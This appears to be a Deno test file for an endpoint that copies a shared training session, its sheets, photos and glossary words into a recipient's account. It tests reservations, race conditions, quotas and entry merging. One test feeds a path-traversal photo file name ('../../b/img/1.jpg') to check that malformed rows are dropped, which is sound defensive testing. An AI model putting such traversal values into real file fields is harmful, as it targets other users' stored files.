  eq((await call(w, post({ token: TOK }))).status, 404);
  w.shares[0].session_id = null; // a row made before session_id (not backfilled)
  eq((await call(w, get(TOK))).status, 404);
});

Deno.test('4. a POST while another one is still copying answers « still copying »; the first one failing leaves nothing announced', async () => {
  const w = world(); let open!: () => void;
  w.copyGate = new Promise(r => { open = r; });
  const first = call(w, post({ token: TOK }));
  for (let i = 0; i < 20; i++) await Promise.resolve(); // the first one waits in its Storage copy
  await new Promise(r => setTimeout(r, 0));
  ok(w.sessions.some(s => s.user_id === LEA && (s.source as Row).share === TOK), 'the reservation is made');
  const second = await call(w, post({ token: TOK }));
  eq([second.status, second.body.error], [409, 'copying']); ok(/Still copying/.test(second.body.message) && /Try again in a moment/.test(second.body.message), second.body.message);
  eq((await call(w, post({ token: TOK, dry_run: true }))).body.copy, null, 'the dry run shows no copy yet');
  w.failCopy = true; open();
  eq((await first).status, 500);
  ok(!w.sessions.some(s => s.user_id === LEA && (s.source as Row).share === TOK), 'the rollback removes the reservation');
  w.failCopy = false;
  const again = await call(w, post({ token: TOK }));
  eq([again.status, again.body.existing], [201, false], 'a later POST makes the copy');
  const done = w.sessions.find(s => s.user_id === LEA && (s.source as Row).share === TOK)!;
  eq((done.source as Row).share_state, 'done');
  eq((await call(w, post({ token: TOK }))).status, 200, 'only now « existing »');
});

Deno.test('4. a reservation left by a run that died (older than STALE_MS) is made again', async () => {
  const w = world();
  w.sessions.push({ id: 'ses-dead', user_id: LEA, slug: 'kicks-2', theme: 'fight', title: 'Kicks du mardi', items: [], source: { share: TOK, share_state: 'copying' }, created_at: new Date(Date.now() - STALE_MS - 1000).toISOString() });
  const r = await call(w, post({ token: TOK }));
  eq([r.status, r.body.slug], [201, 'kicks-2']);
  eq(w.sessions.filter(s => s.user_id === LEA && (s.source as Row).share === TOK).length, 1);
});

Deno.test('5. the session slug skips the slugs kept by notes of deleted sessions (the app rule, takenSlugs)', async () => {
  const w = world();
  w.notes.push({ user_id: LEA, slug: 'session/kicks-2' }, { user_id: LEA, slug: 'session/kicks-3/2' }, { user_id: LEA, slug: 'kicks-4' });
  const r = await call(w, post({ token: TOK }));
  eq(r.body.slug, 'kicks-4', 'kicks (session), kicks-2 and kicks-3 (notes) are taken; a sheet note « kicks-4 » is not a session');
  // a sheet slug kept by a note of a deleted sheet is skipped too
  const w2 = world(); w2.notes.push({ user_id: LEA, slug: 'teep' });
  await call(w2, post({ token: TOK }));
  ok(w2.sheets.some(s => s.user_id === LEA && s.slug === 'teep-2') && !w2.sheets.some(s => s.user_id === LEA && s.slug === 'teep'), 'teep is kept by her note');
});

Deno.test('7. an 80-character slug: collisions are gathered with freeSlug\'s cut, so its cut « -2 » counts', async () => {
  const long = 'x'.repeat(80), cut2 = 'x'.repeat(78) + '-2';
  const w = world();
  w.sessions[0].items = [{ slug: long, dose: '' }]; w.sessions[0].thumbnail = ''; w.sessions[0].slug = 's'.repeat(80);
  w.sheets.push({ id: 'x1', user_id: LAU, slug: long, kind: 'sheet', theme: 'fight', group: 'G', title: 'Long', html: 'x', thumbnail: '', source: { url: 'https://a.test/1' }, exercises: [] });
  w.sheets.push({ id: 'x2', user_id: LEA, slug: long, theme: 'yoga', group: 'G', title: 'Other', html: 'x', source: {} }, { id: 'x3', user_id: LEA, slug: cut2, theme: 'yoga', group: 'G', title: 'Other 2', html: 'x', source: {} });
  w.sessions.push({ id: 'y1', user_id: LEA, slug: 's'.repeat(80), theme: 'yoga', title: 'S', items: [], source: {} }, { id: 'y2', user_id: LEA, slug: 's'.repeat(78) + '-2', theme: 'yoga', title: 'S2', items: [], source: {} });
  const r = await call(w, post({ token: TOK }));
  eq(r.status, 201); eq(r.body.slug, 's'.repeat(78) + '-3');
  ok(w.sheets.some(s => s.user_id === LEA && s.slug === 'x'.repeat(78) + '-3'), 'the sheet gets the next free cut slug');
  eq(slugStem(long), 'x'.repeat(70)); eq(slugStem('teep'), 'teep');
});

// ---------- Codex pass 2 (PR #114): the reservation and the copies of one account ----------

Deno.test('pass 2 #1. the reservation edited meanwhile (another tab dropped its items): the finished copy has all its items again', async () => {
  const w = world(); let open!: () => void;
  w.copyGate = new Promise(r => { open = r; });
  const first = call(w, post({ token: TOK }));
  for (let i = 0; i < 20; i++) await Promise.resolve();
  await new Promise(r => setTimeout(r, 0));
  const res = w.sessions.find(s => s.user_id === LEA && (s.source as Row).share === TOK)!;
  eq((res.source as Row).share_state, 'copying');
  res.items = []; res.thumbnail = ''; // what an edit of the reservation saves: its sheets are not there yet
  open();
  eq((await first).status, 201);
  const ses = w.sessions.find(s => s.user_id === LEA && (s.source as Row).share === TOK)!;
  eq(ses.items, [{ slug: 'my-low-kick', dose: '3 × 8' }, { slug: 'switch-kick-3', dose: '3 × 6' }, { slug: 'teep', dose: '2 × 10', rest: 30 }], 'every item, rewritten');
  eq([ses.thumbnail, (ses.source as Row).share_state], [`${LEA}/teep/img/thumb.jpg`, 'done']);
});

Deno.test('pass 2 #2. two POSTs take up the same dead reservation: the late delete of the second never removes the copy the first finished', async () => {
  const w = world(); let open!: () => void;
  w.sessions.push({ id: 'ses-dead', user_id: LEA, slug: 'kicks-2', theme: 'fight', title: 'Kicks du mardi', items: [], source: { share: TOK, share_state: 'copying' }, created_at: new Date(Date.now() - STALE_MS - 1000).toISOString() });
  w.dropGate = new Promise(r => { open = r; });
  const second = call(w, post({ token: TOK })); // observes the dead reservation, its delete is delayed
  for (let i = 0; i < 20; i++) await Promise.resolve();
  await new Promise(r => setTimeout(r, 0));
  const first = await call(w, post({ token: TOK }));
  eq([first.status, first.body.slug], [201, 'kicks-2'], 'the first one makes the copy again, on the freed slug');
  open();
  const late = await second;
  eq([late.status, late.body.existing, late.body.slug], [200, true, 'kicks-2'], 'the second one gets that copy back');
  const copy = w.sessions.find(s => s.user_id === LEA && (s.source as Row).share === TOK);
  ok(copy && (copy.source as Row).share_state === 'done' && copy.slug === 'kicks-2', 'the finished copy is still there');
  eq(w.sessions.filter(s => s.user_id === LEA && (s.source as Row).share === TOK).length, 1);
});

Deno.test('pass 2 #4. two links at once on a 200 MB account, 150 MB each: one copy at a time, the second answers « still copying a session », then over quota', async () => {
  const TOK2 = 'ZyXwVuTsRqPoNmLkJiHgFe', MB = 1048576;
  const w = world();
  w.quota[LEA] = { max_storage_mb: 200, max_sheets: 300 };
  for (const f of w.files) if (f.name.startsWith(LAU + '/')) f.size = 30 * MB; // 150 MB in all, low-kick (kept) aside: 120 MB copied
  w.files.find(f => f.name === `${LAU}/switch-kick/img/01.jpg`)!.size = 60 * MB;   // 150 MB copied
  w.shares.push({ token: TOK2, owner: LAU, session_id: 'ses-floor', sender_name: 'Laurent', revoked_at: null });
  w.sessions.push({ id: 'ses-floor', user_id: LAU, slug: 'floor', theme: 'fight', title: 'Floor', items: [{ slug: 'plank', dose: '60 s' }], source: {}, thumbnail: '' });
  w.sheets.push({ id: 'p1', user_id: LAU, slug: 'plank', kind: 'sheet', theme: 'fight', group: 'Floor', title: 'Plank', html: '<p>plank</p>', thumbnail: '', source: { url: 'https://youtu.be/plank' }, exercises: [] });
  w.files.push({ name: `${LAU}/plank/img/01.jpg`, size: 150 * MB });
  let open!: () => void;
  w.copyGate = new Promise(r => { open = r; });
  const first = call(w, post({ token: TOK }));
  for (let i = 0; i < 20; i++) await Promise.resolve();
  await new Promise(r => setTimeout(r, 0));
  const second = await call(w, post({ token: TOK2 }));
  eq([second.status, second.body.error, second.body.message], [409, 'copying', 'Still copying a session. Try again in a moment.']);
  ok(!w.sessions.some(s => s.user_id === LEA && (s.source as Row).share === TOK2), 'the second one reserves nothing');
  open();
  eq((await first).status, 201);
  const again = await call(w, post({ token: TOK2 }));
  eq([again.status, again.body.error], [403, 'quota'], 'the quota is checked once the first copy is in');
  const used = w.files.filter(f => f.name.startsWith(LEA + '/')).reduce((n, f) => n + f.size, 0);
  ok(used <= 200 * MB, `Léa holds ${used / MB} MB`);
  ok(!w.sessions.some(s => s.user_id === LEA && (s.source as Row).share === TOK2), 'the refused copy leaves no reservation');
});

Deno.test('pass 2 #4. a reservation of another link left by a run that died does not block the copies of the account', async () => {
  const w = world();
  w.sessions.push({ id: 'ses-dead', user_id: LEA, slug: 'old', theme: 'fight', title: 'Old', items: [], source: { share: 'ZyXwVuTsRqPoNmLkJiHgFe', share_state: 'copying' }, created_at: new Date(Date.now() - STALE_MS - 1000).toISOString() });
  const r = await call(w, post({ token: TOK }));
  eq(r.status, 201);
  ok(!w.sessions.some(s => s.id === 'ses-dead'), 'the dead reservation is deleted');
});

Deno.test('pass 3 #1. the notebook title unreadable once the copy is done: 201 with the notebook id as its title, nothing undone; a retry gets the copy back', async () => {
  const w = world(); w.failThemeReadOf = LEA;
  const r = await call(w, post({ token: TOK }));
  eq([r.status, r.body.slug, r.body.notebook, r.body.existing, r.body.kept, r.body.copied], [201, 'kicks-2', { id: 'fight', title: 'fight' }, false, 1, 2]);
  const ses = w.sessions.find(s => s.user_id === LEA && s.slug === 'kicks-2');
  ok(ses, 'the finished copy stays'); eq((ses!.source as Row).share_state, 'done');
  eq(w.sheets.filter(s => s.user_id === LEA).map(s => s.slug).sort(), ['my-low-kick', 'switch-kick', 'switch-kick-3', 'teep'], 'the copied sheets stay');
  ok(w.files.some(f => f.name === `${LEA}/teep/img/thumb.jpg`), 'the copied photos stay');
  const again = await call(w, post({ token: TOK }));
  eq([again.status, again.body.slug, again.body.notebook, again.body.existing], [200, 'kicks-2', { id: 'fight', title: 'fight' }, true]);
});

// ---------------------------------------------------------------------------------------------------------------
// P11 G5: a session sent to a partner carries the glossary words of its sheets (words.ts). Synthetic words only.
// In world(), Léa keeps her own low kick (not copied), switch-kick is copied as switch-kick-3, teep as teep.
const READ_AT = '2026-11-09T08:00:00.000000+00:00';
const word = (id: string, user_id: string, theme: string, term: string, sheets: Row[], more: Row = {}): Row => ({
  id, user_id, theme, term, sense: null, forms: [term.toLowerCase()], kind: 'move', definition: `What « ${term} » means.`, confidence: 'sure', doubt: null,
  spelling: null, photo: null, related: [], sheets, created_at: READ_AT, updated_at: 'u0', ...more });
const it = (slug: string, quote: string, where = 'text'): Row => ({ slug, quote, where });
function glossaryWorld(): World {
  const w = world();
  for (const s of w.sheets) if (s.user_id === LAU) s.updated_at = READ_AT;
  w.words = [
    word('g1', LAU, 'fight', 'Chamber', [it('switch-kick', 'lift the chamber'), it('low-kick', 'chamber first'), it('not-shared', 'chambers', 'caption')],
      { forms: ['chamber', 'chambers'], photo: { slug: 'switch-kick', file: '02.jpg' }, related: ['Teep'], confidence: 'unsure', doubt: 'Maybe the knee.', spelling: 'chambre' }),
    word('g2', LAU, 'fight', 'Teep', [it('teep', 'the teep', 'title')], { photo: { slug: 'low-kick', file: '01.jpg' } }),
    word('g3', LAU, 'fight', 'Shin', [it('low-kick', 'with the shin')]),          // only on the sheet Léa keeps
    word('g4', LAU, 'fight', 'Clinch', [it('not-shared', 'in the clinch')]),      // a sheet outside the session
    word('g5', LAU, 'other', 'Pivot', [it('teep', 'pivot the foot')]),            // another notebook's entry naming a slug of this one
  ];
  w.passes = [{ user_id: LAU, theme: 'fight', slug: 'switch-kick', sheet_updated_at: READ_AT }, { user_id: LAU, theme: 'fight', slug: 'low-kick', sheet_updated_at: READ_AT }];
  return w;
}
const wordsOf = (w: World, uid: string) => w.words.filter(x => x.user_id === uid);
const copyOnly = (w: World) => JSON.stringify([w.sheets.filter(s => s.user_id === LEA), w.files, w.themes, w.sessions.filter(s => s.user_id === LEA).map(s => ({ ...s, id: 0, created_at: 0 }))]);

Deno.test('G5: the words of the copied sheets arrive in the notebook of the copy, with only the items of the copied sheets, slugs and photo rewritten', async () => {
  const w = glossaryWorld();
  const r = await call(w, post({ token: TOK }));
  eq([r.status, Object.keys(r.body)], [201, ['slug', 'notebook', 'existing', 'kept', 'copied']], 'the answer is the one of a share without words');
  const mine = wordsOf(w, LEA);
  eq(mine.map(x => [x.theme, x.term]), [['fight', 'Chamber'], ['fight', 'Teep']], 'not the word of the kept sheet, of a sheet outside the session, of another notebook');
  const { id: _i, updated_at: _u, ...chamber } = mine[0];
  eq(chamber, { user_id: LEA, theme: 'fight', term: 'Chamber', sense: null, forms: ['chamber', 'chambers'], kind: 'move', definition: 'What « Chamber » means.',
    confidence: 'unsure', doubt: 'Maybe the knee.', spelling: 'chambre', photo: { slug: 'switch-kick-3', file: '02.jpg' }, related: ['Teep'],
    sheets: [it('switch-kick-3', 'lift the chamber')] }, 'copied as it is, but for the items and the photo');
  eq([mine[1].photo, mine[1].sheets], [null, [it('teep', 'the teep', 'title')]], 'a photo from a sheet that was not copied does not travel');
  eq(wordsOf(w, LAU).length, 5, 'the sender glossary is only read');
});

// Codex pass 1 on #145: the share marks no copied sheet as read. Both ways of marking raced (below), and a wrong mark
// hides a sheet from the recipient's pass for good. `toRead` is the pass's own rule (tools/rb.py, _needs_pass): a sheet
// without a row, or published after the version its row names.
const toRead = (w: World, uid: string) => w.sheets.filter(s => s.user_id === uid && !w.passes.some(p => p.user_id === uid && p.slug === s.slug
  && Date.parse(String(s.updated_at)) <= Date.parse(String(p.sheet_updated_at)))).map(s => String(s.slug));
const passSteps = () => journal.filter(j => j.includes('passes'));
const COPIES = ['switch-kick-3', 'teep'];

Deno.test('G5: the share writes no glossary_passes row and reads none — every copied sheet stays to read by the recipient pass', async () => {
  const w = glossaryWorld(); journal.length = 0;
  const senderRows = JSON.stringify(w.passes);
  await call(w, post({ token: TOK }));
  eq(wordsOf(w, LEA).map(x => x.term), ['Chamber', 'Teep'], 'the words arrive');
  eq([JSON.stringify(w.passes), passSteps()], [senderRows, []], 'the sender rows are as they were, and no call names the table');
  eq(toRead(w, LEA).filter(s => COPIES.includes(s)), COPIES, 'the sender pass had read switch-kick: its copy is still to read');
  const glossarySteps = journal.slice(journal.indexOf('read glossary_words'));
  eq([...new Set(glossarySteps)], ['read glossary_words', 'insert glossary_words', 'read user_themes'], 'once the copy is done: the entries, then the title for the answer (no sheet read again)');
});

Deno.test('G5 (Codex pass 1, race 1): the sender pass writes its words and its row while the share runs — no word, and no row: the sheets stay to read', async () => {
  const w = glossaryWorld(); journal.length = 0;
  const lateWords = w.words, lateRows = w.passes; w.words = []; w.passes = []; // the share reads a glossary still empty…
  w.meanwhile = (step, uid) => { // …then the sender's pass writes its entries and its rows
    if (step === 'read glossary_words' && uid === LAU) { w.meanwhile = undefined; w.words.push(...lateWords); w.passes.push(...lateRows); }
  };
  const r = await call(w, post({ token: TOK }));
  eq([r.status, r.body.copied, wordsOf(w, LEA)], [201, 2, []], 'the share stands, without words');
  eq([w.passes.filter(p => p.user_id === LEA), w.passes.length, passSteps()], [[], lateRows.length, []], 'no row for the recipient, whatever the sender wrote meanwhile');
  eq(toRead(w, LEA).filter(s => COPIES.includes(s)), COPIES, 'her own pass reads both copies: the words are not lost');
});

Deno.test('G5 (Codex pass 1, race 2): the recipient publishes a copied sheet again while its words are copied — no row: the new version stays to read', async () => {
  const w = glossaryWorld(); journal.length = 0;
  const AGAIN = '2026-11-10T12:00:01.000000+00:00'; // after COPY_AT
  w.meanwhile = step => { // the copy is there, its first word is on its way: she publishes it again
    if (step === 'insert glossary_words') { w.meanwhile = undefined; w.sheets.find(s => s.user_id === LEA && s.slug === 'switch-kick-3')!.updated_at = AGAIN; }
  };
  const r = await call(w, post({ token: TOK }));
  eq([r.status, wordsOf(w, LEA).map(x => x.term)], [201, ['Chamber', 'Teep']], 'the words of the version that was copied arrive');
  eq([w.sheets.find(s => s.user_id === LEA && s.slug === 'switch-kick-3')!.updated_at, w.passes.filter(p => p.user_id === LEA), passSteps()], [AGAIN, [], []],
    'no row dated as her new version, nor as the copy');
  eq(toRead(w, LEA).filter(s => COPIES.includes(s)), COPIES, 'her pass reads the version she published');
});

Deno.test('G5: a session whose sheets come from two notebooks — each sheet brings the words of its own notebook, into the one notebook of the copy', async () => {
  const w = glossaryWorld();
  w.sheets.find(s => s.user_id === LAU && s.slug === 'teep')!.theme = 'boxing'; // the session is in « fight »
  w.words.push(word('b1', LAU, 'boxing', 'Hip', [it('teep', 'push the hip')]),
    word('b2', LAU, 'boxing', 'chamber', [it('teep', 'Chambered knee')], { forms: ['chambered', 'Chamber'], definition: 'The boxing notebook says it otherwise.' }));
  const r = await call(w, post({ token: TOK, notebook: 'yoga' }));
  eq(r.status, 201);
  const mine = wordsOf(w, LEA);
  eq(mine.map(x => [x.theme, x.term]), [['yoga', 'Chamber'], ['yoga', 'Hip']], '« Teep » of « fight » names a sheet that is now in « boxing »: it stays');
  eq([mine[0].definition, mine[0].forms, mine[0].sheets], ['What « Chamber » means.', ['chamber', 'chambers', 'chambered'],
    [it('switch-kick-3', 'lift the chamber'), it('teep', 'Chambered knee')]], 'one identity in two sender notebooks: one entry, the first definition, forms united');
});

Deno.test('G5: a word with two senses arrives as two entries', async () => {
  const w = glossaryWorld();
  w.words = [word('s1', LAU, 'fight', 'Guard', [it('teep', 'keep your guard')], { sense: 'stance' }), word('s2', LAU, 'fight', 'Guard', [it('teep', 'from the guard')], { sense: 'on the ground' })];
  await call(w, post({ token: TOK }));
  eq(wordsOf(w, LEA).map(x => [x.term, x.sense, x.sheets]), [['Guard', 'stance', [it('teep', 'keep your guard')]], ['Guard', 'on the ground', [it('teep', 'from the guard')]]]);
});

Deno.test('G5: a recipient who already has the word keeps her definition, doubt and photo; forms united, items added; nothing else of hers changes', async () => {
  const w = glossaryWorld();
  const hers = word('l1', LEA, 'yoga', 'CHAMBER', [it('my-low-kick', 'Chamber up')], { forms: ['Chamber'], definition: 'Hers.', confidence: 'unsure', doubt: 'Her doubt.', photo: { slug: 'my-low-kick', file: 'x.jpg' }, related: ['Hers'] });
  const other = word('l2', LEA, 'yoga', 'Breath', [it('my-low-kick', 'breath out')]), elsewhere = word('l3', LEA, 'strength', 'Teep', [it('gone', 'teep')]);
  w.words.push(hers, other, elsewhere);
  const before = structuredClone([other, elsewhere]);
  await call(w, post({ token: TOK, notebook: 'yoga' }));
  const mine = wordsOf(w, LEA);
  eq(mine.map(x => [x.theme, x.term]), [['yoga', 'CHAMBER'], ['yoga', 'Breath'], ['strength', 'Teep'], ['yoga', 'Teep']], 'no second « chamber »; « Teep » of another notebook of hers is another entry');
  const { updated_at: _u, ...merged } = mine[0];
  eq(merged, { ...hers, updated_at: undefined, forms: ['Chamber', 'chambers'], sheets: [it('my-low-kick', 'Chamber up'), it('switch-kick-3', 'lift the chamber')] }, 'term, definition, doubt, photo, related: hers');
  eq([mine[1], mine[2]], before, 'her other entries are untouched');
});

Deno.test('G5: a backend without the glossary table shares exactly as before, without words and without error', async () => {
  const plain = world(), w = glossaryWorld(); w.noGlossary = true;
  for (const s of plain.sheets) if (s.user_id === LAU) s.updated_at = READ_AT;
  const errors: unknown[] = [], real = console.error; console.error = (...a: unknown[]) => { errors.push(a); };
  try {
    const a = await call(plain, post({ token: TOK })), b = await call(w, post({ token: TOK }));
    eq([b.status, { ...b.body }], [201, { ...a.body }]);
  } finally { console.error = real; }
  eq(copyOnly(w), copyOnly(plain), 'the same session, sheets, photos and notebook');
  eq([wordsOf(w, LEA), w.passes.filter(p => p.user_id === LEA), errors], [[], [], []], 'nothing written, nothing logged as an error');
});

Deno.test('G5: a failure while copying the words never fails the share — no right on the table, or one entry refused', async () => {
  const errors: string[] = [], real = console.error; console.error = (...a: unknown[]) => { errors.push(a.join(' ')); };
  try {
    const plain = glossaryWorld(); plain.words = []; plain.passes = [];
    await call(plain, post({ token: TOK }));
    const w = glossaryWorld(); w.failGlossary = '42501'; // the function deployed before schema.sql gives the service role its rights
    const r = await call(w, post({ token: TOK }));
    eq([r.status, r.body.copied, copyOnly(w)], [201, 2, copyOnly(plain)], 'the copy stands, whole');
    eq([wordsOf(w, LEA), errors], [[], ['share: words not copied 42501']], 'logged as not copied, by its code only');
    const w2 = glossaryWorld(); w2.failWordInsert = 1; errors.length = 0;
    const r2 = await call(w2, post({ token: TOK }));
    eq([r2.status, wordsOf(w2, LEA).map(x => x.term), errors], [201, ['Teep'], ['share: a word was not copied 500']], 'the other word is written');
    eq([w2.passes.filter(p => p.user_id === LEA), toRead(w2, LEA).filter(s => COPIES.includes(s))], [[], COPIES], 'the sheets whose words are incomplete stay to read');
    eq(w2.sessions.find(s => s.user_id === LEA && s.slug === 'kicks-2')!.source, { share: TOK, shared_by: 'Laurent', share_state: 'done' });
  } finally { console.error = real; }
});

Deno.test('G5: opening the link twice, or a dead run made again — no duplicate entry, no duplicate item', async () => {
  const w = glossaryWorld();
  await call(w, post({ token: TOK }));
  const first = JSON.stringify([wordsOf(w, LEA), w.passes]);
  journal.length = 0;
  const again = await call(w, post({ token: TOK }));
  eq([again.status, again.body.existing, JSON.stringify([wordsOf(w, LEA), w.passes])], [200, true, first]);
  ok(!journal.some(j => j.includes('glossary')), 'a copy that exists does not touch the glossary again');
  // a run that died after its sheets, before finishing: the copy is made again; the sheets it left are kept (the
  // same video and title), not copied, so nothing is written twice
  const ses = w.sessions.find(s => s.user_id === LEA && s.slug === 'kicks-2')!;
  ses.source = { ...(ses.source as Row), share_state: 'copying' }; ses.created_at = new Date(Date.now() - STALE_MS - 1000).toISOString();
  const redo = await call(w, post({ token: TOK }));
  eq([redo.status, redo.body.kept, redo.body.copied], [201, 3, 0]);
  eq(JSON.stringify([wordsOf(w, LEA), w.passes]), first, 'nothing added, nothing doubled');
});

Deno.test('G5: an entry of hers written meanwhile (her own pass) is merged, not overwritten nor doubled', async () => {
  const w = glossaryWorld(); // her pass inserts « chamber » between our reading and our insert
  w.raceWord = word('r1', LEA, 'fight', 'chamber', [it('own', 'chamber')], { definition: 'Hers, just written.' });
  await call(w, post({ token: TOK }));
  const got = wordsOf(w, LEA).filter(x => String(x.term).toLowerCase() === 'chamber');
  eq(got.map(x => [x.definition, x.forms, x.sheets]), [['Hers, just written.', ['chamber', 'chambers'], [it('own', 'chamber'), it('switch-kick-3', 'lift the chamber')]]]);
  const w2 = glossaryWorld(); // her pass adds a sheet to her entry between our reading and our update
  w2.words.push(word('l1', LEA, 'fight', 'Teep', [it('hers', 'teep')])); w2.bumpWord = it('hers-2', 'teep again');
  await call(w2, post({ token: TOK }));
  eq(wordsOf(w2, LEA).find(x => x.term === 'Teep')!.sheets, [it('hers', 'teep'), it('hers-2', 'teep again'), it('teep', 'the teep', 'title')], 'her item written meanwhile is kept');
});

Deno.test('G5: planWords and mergeWord — malformed rows of the sender are left out, merging twice changes nothing', () => {
  const copied = [{ from: { slug: 'a', theme: 't' }, slug: 'a-2' }];
  const bad = [word('x1', LAU, 't', ' ', [it('a', 'q')]), word('x2', LAU, 't', 'NoDef', [it('a', 'q')], { definition: 7 }), word('x3', LAU, 't', 'Conf', [it('a', 'q')], { confidence: 'maybe' }),
    word('x4', LAU, 't', 'NoItem', [it('a', 'q', 'footer'), { slug: 'a' }, 'a'] as Row[]), word('x5', LAU, 't', 'Kept', [it('a', 'q'), it('a', 'q2')],
      { forms: ['kept', 3, ''], related: 'x', sense: ' ', photo: { slug: 'a', file: '../../b/img/1.jpg' }, doubt: 9 })];
  const rows = planWords(bad, copied, LEA, 'n');
  eq(rows, [{ user_id: LEA, theme: 'n', term: 'Kept', sense: null, forms: ['kept'], kind: 'move', definition: 'What « Kept » means.', confidence: 'sure', doubt: null,
    spelling: null, photo: null, related: [], sheets: [it('a-2', 'q')] }]);
  const old = { forms: ['Kept', 'x'], sheets: [it('z', 'x'), 'odd', it('a-2', 'old')] };
  const patch = mergeWord(old, rows[0]);
  eq(patch, { sheets: [it('z', 'x'), 'odd', it('a-2', 'q')] }, 'forms already there (case ignored); the item of a slug already listed takes its place; nothing of the stored entry is dropped');
  eq(mergeWord({ ...old, ...patch }, rows[0]), {}, 'a second merge writes nothing');
});
